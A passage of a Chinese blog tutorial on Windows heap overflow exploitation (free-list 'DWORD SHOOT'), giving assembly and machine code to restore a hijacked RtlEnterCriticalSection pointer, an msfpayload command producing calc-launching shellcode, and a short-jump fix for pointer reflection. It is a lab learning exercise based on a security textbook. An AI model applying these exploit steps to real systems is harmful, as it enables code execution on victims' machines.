+<li>恢复现场<br>我们修改了RtlEnterCriticalSection函数的地址，这很可能影响到系统的其他程序，所以在我们运行shellcode之前应该，将之前的数据恢复，之前我们也记录了正确的RtlEnterCriticalSection函数地址我们将它恢复回去。<br>我们可以使用下面三条的汇编指令实现<br>mov eax,77F89103h<br>mov ebx,7FFDF020h<br>mov dword ptr ds:[ebx],eax<br>使用AsmToE工具将汇编转换成机器码如下，<br>\xB8\x03\x91\xF8\x77\xBB\x20\xF0\xFD\x7F\x89\x03</li>
+<li>生成shellcode<br>我这里使用Kali 系统的msfpayload生成了一个shellcode，命令如下：<br>msfpayload windows/exec CMD=”cmd /k calc” R|msfencode -e x86/shikata_ga_nai -b “\x00” -t c</li>
+<li>替换shellcode<br>终极shellcode如下图：<br><img src="http://img.blog.csdn.net/20170318221429961?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMjEyMTA5OTU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt=""></li>
+<li><p>注释掉断点运行结果如下图，可以看出来shellcode运行成功了，我们的攻击也成功了。<br><img src="http://img.blog.csdn.net/20170318221448242?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMjEyMTA5OTU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt=""></p>
+</li>
+<li><p>指针反射<br>这里讲一下之前为什么要求shellcode从第八个字节之后，在正式开始，我们可以先看一下DWORD SHOOT 之后第一个堆块里的变化，可以看到第四个字节之后写入了新的数据并不是之前的90，这是因为DOWRD SHOOT 发生在链表卸载的第一句上，第二句会继续执行，将Blink的值写入shellcode起始位置偏移加4的位置，好在大多是情况下不会影响shellcode的正常运行。<br><img src="http://img.blog.csdn.net/20170318221508758?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMjEyMTA5OTU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt=""></p>
+</li>
+<li>对”指针反射”的解决<br>这里也提出一个办法绕过可以使用下面的指令短跳转过这四个字节，他们的机器码为EB+偏移，shellcode修改如下图即可。<br><img src="http://img.blog.csdn.net/20170318221524649?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMjEyMTA5OTU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt=""><br>0x003 总结<br>经过这次实验，对上一节的堆结构更加深入的理解，同时对空表DWORD SHOOT 的利用有了更深入的了解，以后一定要多动手多练习，这样才能加深对知识的理解和利用，下一节我会动手多一下块表的DWORD SHOOT 的原理和利用。<br>0x004 参考书籍<br>[1]:《0day安全 软件漏洞分析技术 （第二版）》王清</li>
+</ol>
+  
+	</div>
+		<footer class="article-footer clearfix">
+<div class="article-catetags">
+
+<div class="article-categories">
+  <span></span>
+  <a class="article-category-link" href="/categories/漏洞基础/">漏洞基础</a>
+</div>
+
+
+  <div class="article-tags">
+  
+  <span></span> <a href="/tags/漏洞/">漏洞</a>
+  </div>
+
+</div>
+
+
+
+	<div class="article-share" id="share">
+	
+	  <div data-url="http://Reshahar.github.io/2017/04/13/堆溢出（二）空表DWORD SHOOT/" data-title="堆溢出（二）空表 DWORD SHOOT | Reshahar的博客" data-tsina="null" class="share clearfix">
+	  </div>
+	
+	</div>
+
+
+</footer>
+
+   	       
+	</article>
+	
+<nav class="article-nav clearfix">
+ 
+ <div class="prev" >
+ <a href="/2017/04/12/堆溢出（一）堆结构/" title="堆溢出（一）堆结构">
+  <strong>上一篇：</strong><br/>
+  <span>
+  堆溢出（一）堆结构</span>
+</a>
+</div>
+
+
+<div class="next">
+<a href="/2017/04/13/堆溢出（三）快表DWORD SHOOT/"  title="堆溢出（三）快表DWORD SHOOT">
+ <strong>下一篇：</strong><br/> 
+ <span>堆溢出（三）快表DWORD SHOOT
+</span>
+</a>
+</div>
+
+</nav>
+
+	
+
+</div>  
+      <div class="openaside"><a class="navbutton" href="#" title="显示侧边栏"></a></div>
+
+  <div id="toc" class="toc-aside">
+  <strong class="toc-title">文章目录</strong>
+ 
+ 
+ 
+  </div>
+
+<div id="asidepart">
+<div class="closeaside"><a class="closebutton" href="#" title="隐藏侧边栏"></a></div>
+<aside class="clearfix">
+
+  
+
+
+  
+<div class="categorieslist">
+	<p class="asidetitle">分类</p>
+		<ul>
+		
+		  
+			<li><a href="/categories/其它/" title="其它">其它<sup>1</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/漏洞基础/" title="漏洞基础">漏洞基础<sup>4</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/逆向工程/" title="逆向工程">逆向工程<sup>2</sup></a></li>
+		  
+		
+		</ul>
+</div>
+
+
+  
+<div class="tagslist">
+	<p class="asidetitle">标签</p>
+		<ul class="clearfix">
+		
+			
+				<li><a href="/tags/漏洞/" title="漏洞">漏洞<sup>3</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/漏洞-溢出/" title="漏洞 溢出">漏洞 溢出<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/linux-gcc/" title="linux gcc">linux gcc<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/逆向-ctf/" title="逆向 ctf">逆向 ctf<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/逆向-脱壳/" title="逆向 脱壳">逆向 脱壳<sup>1</sup></a></li>
+			
+		
+		</ul>
+</div>
+
+
+  <div class="linkslist">
+  <p class="asidetitle">友情链接</p>
+    <ul>
+        
+          <li>
+            
+            	<a href="https://github.com" target="_blank" title="github">github</a>
+            
+          </li>
+        
+    </ul>
+</div>
+
+  
+
+
+</aside>
+</div>
+    </div>
+    <footer><div id="footer" >
+	
+	<div class="line">
+		<span></span>
+		<div class="author"></div>
+	</div>
+	
+	
+	<section class="info">
+		<p> Hello ,I&#39;m Reshahar. <br/>
+			Thank you for your support.</p>
+	</section>
+	 
+	<div class="social-font" class="clearfix">
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+	</div>
+			
+		
+
+		<p class="copyright">
+		Powered by <a href="http://hexo.io" target="_blank" title="hexo">hexo</a> and Theme by <a href="https://github.com/wuchong/jacman" target="_blank" title="Jacman">Jacman</a> © 2017 
+		
+		<a href="/" target="_blank" title="Reshahar">Reshahar</a>
+		
+		
+		&nbsp
+		<span id="busuanzi_container_site_uv" > 
+  		Total <span id="busuanzi_value_site_uv"></span> views.
+		</span>
+
+		</p>
+</div>
+</footer>
+    <script src="/js/jquery-2.0.3.min.js"></script>
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/jquery.qrcode-0.12.0.min.js"></script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.navbar').click(function(){
+    $('header nav').toggleClass('shownav');
+  });
+  var myWidth = 0;
+  function getSize(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+  };
+  var m = $('#main'),
+      a = $('#asidepart'),
+      c = $('.closeaside'),
+      o = $('.openaside');
+  c.click(function(){
+    a.addClass('fadeOut').css('display', 'none');
+    o.css('display', 'block').addClass('fadeIn');
+    m.addClass('moveMain');
+  });
+  o.click(function(){
+    o.css('display', 'none').removeClass('beforeFadeIn');
+    a.css('display', 'block').removeClass('fadeOut').addClass('fadeIn');      
+    m.removeClass('moveMain');
+  });
+  $(window).scroll(function(){
+    o.css("top",Math.max(80,260-$(this).scrollTop()));
+  });
+  
+  $(window).resize(function(){
+    getSize(); 
+    if (myWidth >= 1024) {
+      $('header nav').removeClass('shownav');
+    }else{
+      m.removeClass('moveMain');
+      a.css('display', 'block').removeClass('fadeOut');
+      o.css('display', 'none');
+      
+      $('#toc.toc-aside').css('display', 'none');
+        
+    }
+  });
+});
+</script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var ai = $('.article-content>iframe'),
+      ae = $('.article-content>embed'),
+      t  = $('#toc'),
+      ta = $('#toc.toc-aside'),
+      o  = $('.openaside'),
+      c  = $('.closeaside');
+  if(ai.length>0){
+    ai.wrap('<div class="video-container" />');
+  };
+  if(ae.length>0){
+   ae.wrap('<div class="video-container" />');
+  };
+  c.click(function(){
+    ta.css('display', 'block').addClass('fadeIn');
+  });
+  o.click(function(){
+    ta.css('display', 'none');
+  });
+  $(window).scroll(function(){
+    ta.css("top",Math.max(140,320-$(this).scrollTop()));
+  });
+});
+</script>
+
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var $this = $('.share'),
+      url = $this.attr('data-url'),
+      encodedUrl = encodeURIComponent(url),
+      title = $this.attr('data-title'),
+      tsina = $this.attr('data-tsina'),
+      description = $this.attr('description');
+  var html = [
+  '<div class="hoverqrcode clearfix"></div>',
+  '<a class="overlay" id="qrcode"></a>',
+  '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="article-share-facebook" target="_blank" title="Facebook"></a>',
+  '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="article-share-twitter" target="_blank" title="Twitter"></a>',
+  '<a href="#qrcode" class="article-share-qrcode" title="微信"></a>',
+  '<a href="http://widget.renren.com/dialog/share?resourceUrl=' + encodedUrl + '&srcUrl=' + encodedUrl + '&title=' + title +'" class="article-share-renren" target="_blank" title="人人"></a>',
+  '<a href="http://service.weibo.com/share/share.php?title='+title+'&url='+encodedUrl +'&ralateUid='+ tsina +'&searchPic=true&style=number' +'" class="article-share-weibo" target="_blank" title="微博"></a>',
+  '<span title="Share to"></span>'
+  ].join('');
+  $this.append(html);
+
+  $('.hoverqrcode').hide();
+
+  var myWidth = 0;
+  function updatehoverqrcode(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+    var qrsize = myWidth > 1024 ? 200:100;
+    var options = {render: 'image', size: qrsize, fill: '#2ca6cb', text: url, radius: 0.5, quiet: 1};
+    var p = $('.article-share-qrcode').position();
+    $('.hoverqrcode').empty().css('width', qrsize).css('height', qrsize)
+                          .css('left', p.left-qrsize/2+20).css('top', p.top-qrsize-10)
+                          .qrcode(options);
+  };
+  $(window).resize(function(){
+    $('.hoverqrcode').hide();
+  });
+  $('.article-share-qrcode').click(function(){
+    updatehoverqrcode();
+    $('.hoverqrcode').toggle();
+  });
+  $('.article-share-qrcode').hover(function(){}, function(){
+      $('.hoverqrcode').hide();
+  });
+});   
+</script>
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.article-content').each(function(i){
+    $(this).find('img').each(function(){
+      if ($(this).parent().hasClass('fancybox')) return;
+      var alt = this.alt;
+      if (alt) $(this).after('<span class="caption">' + alt + '</span>');
+      $(this).wrap('<a href="' + this.src + '" title="' + alt + '" class="fancybox"></a>');
+    });
+    $(this).find('.fancybox').each(function(){
+      $(this).attr('rel', 'article' + i);
+    });
+  });
+  if($.fancybox){
+    $('.fancybox').fancybox();
+  }
+}); 
+</script>
+
+
+
+<!-- Analytics Begin -->
+
+
+
+
+
+<script type="text/javascript">var cnzz_protocol = (("https:" == document.location.protocol) ? " https://" : " http://");document.write(unescape("%3Cspan id='cnzz_stat_icon_1261726505'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "s4.cnzz.com/z_stat.php%3Fid%3D1261726505%26show%3Dpic1' type='text/javascript'%3E%3C/script%3E"));</script>
+
+<!-- Analytics End -->
+
+<!-- Totop Begin -->
+
+	<div id="totop">
+	<a title="返回顶部"><img src="/img/scrollup.png"/></a>
+	</div>
+	<script src="/js/totop.js"></script>
+
+<!-- Totop End -->
+
+<!-- MathJax Begin -->
+<!-- mathjax config similar to math.stackexchange -->
+
+
+<!-- MathJax End -->
+
+<!-- Tiny_search Begin -->
+
+<!-- Tiny_search End -->
+
+  </body>
+</html>
+
